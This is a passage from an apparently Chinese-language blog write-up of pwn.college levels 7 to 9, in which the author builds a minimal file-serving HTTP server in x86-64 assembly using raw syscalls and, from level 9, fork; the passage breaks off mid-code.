<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">read(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;GET /tmp/tmpper_iarh HTTP/1.1<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Host: localhost<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>User-Agent: python-requests/2.32.3<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept-Encoding: gzip, deflate, zstd<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Accept: */*<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection: keep-alive<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-number">256</span>) <span class="hljs-operator">=</span> <span class="hljs-number">161</span><br></code></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241031112813128.png" srcset="/img/loading.gif" lazyload class="" title="image-20241031112813128">

<p>我发现了一个简单的方法用变量存起来就好了，然后截断第一个空格。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>              # read<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure>



<h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8"></a>level8</h4><p>这一关就是加一个accept调用即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # read(<span class="hljs-number">4</span>,buf,count_bytes)<br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, buffer+<span class="hljs-number">4</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path<br><span class="hljs-symbol">loop_start:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsi</span>]<br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">al</span>, <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">je</span> get_file_path<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>], <span class="hljs-built_in">al</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> loop_start<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">get_file_path:</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, file_path # open(<span class="hljs-string">&quot;file_path&quot;</span>, O_RDONLY)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>              # read(the_file,buf,<span class="hljs-number">256</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">256</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">syscall</span> <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">5</span>      # close(<span class="hljs-number">5</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>, <span class="hljs-number">19</span>) = <span class="hljs-number">19</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span> + ret_normal_msg] <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">19</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # write(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;file_buf&quot;</span>, <span class="hljs-built_in">r8</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r8</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">0</span>       # SYS_exit<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .data<br><span class="hljs-symbol">socket_addr:</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">2</span><br><span class="hljs-meta">    .2byte</span> <span class="hljs-number">0x5000</span><br><span class="hljs-meta">    .4byte</span> <span class="hljs-number">0</span><br><span class="hljs-meta">    .8byte</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">ret_normal_msg:</span><br><span class="hljs-meta">    .ascii</span> <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="hljs-symbol">buffer:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">256</span><br><span class="hljs-symbol">file_path:</span><br><span class="hljs-meta">    .space</span> <span class="hljs-number">64</span> <br><br></code></pre></td></tr></table></figure>



<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>这道题要用fork，经过第七题的拷打之后，简单一些了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">.section</span> .text<br><span class="hljs-symbol">_start:</span>     <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">2</span>      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">41</span> <br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # bind(<span class="hljs-number">3</span>, &#123;sa_family=AF_INET, sin_port=htons(<span class="hljs-number">80</span>), sin_addr=inet_addr(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)&#125;, <span class="hljs-number">16</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rip</span>+socket_addr]<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">16</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">49</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # listen(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>) = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">50</span><br>    <span class="hljs-keyword">syscall</span> <br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">57</span>     # fork()<br>    <span class="hljs-keyword">syscall</span><br>    <br>    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">je</span> child_process<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">4</span>      # close(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # accept(<span class="hljs-number">3</span>, NULL, NULL) = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">43</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">jmp</span> done<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">child_process:</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>      # close(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">3</span><br>    <span 